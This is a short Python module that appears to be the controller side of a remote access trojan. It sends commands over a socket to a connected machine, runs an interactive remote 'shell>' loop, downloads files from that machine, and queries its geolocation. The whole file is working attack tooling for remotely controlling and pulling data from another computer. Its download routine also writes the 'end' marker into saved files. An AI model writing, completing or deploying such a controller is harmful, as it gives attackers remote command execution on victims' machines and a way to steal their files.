import socket

from rich import print


def get_geolocation(cmd: str, conn: socket.socket) -> None:
    conn.send(cmd.encode())
    result = conn.recv(20480).decode()
    print(result)


def shell(cmd: str, conn: socket.socket) -> None:
    conn.send(cmd.encode())

    while True:
        cmd = str(input('shell> '))
        conn.send(cmd.encode())
        if cmd == 'exit':
            break
        result = conn.recv(20480).decode()
        print(result)


def download(cmd: str, conn: socket.socket) -> None:
    file_name = input('input local filename to save ')
    conn.send(cmd.encode())

    with open(file_name, 'wb') as file:
        while True:
            data = conn.recv(1024)

            if data.endswith('end'.encode()):
                file.write(data)
                break

            file.write(data)
    print('[bold green]success download[/bold green]')
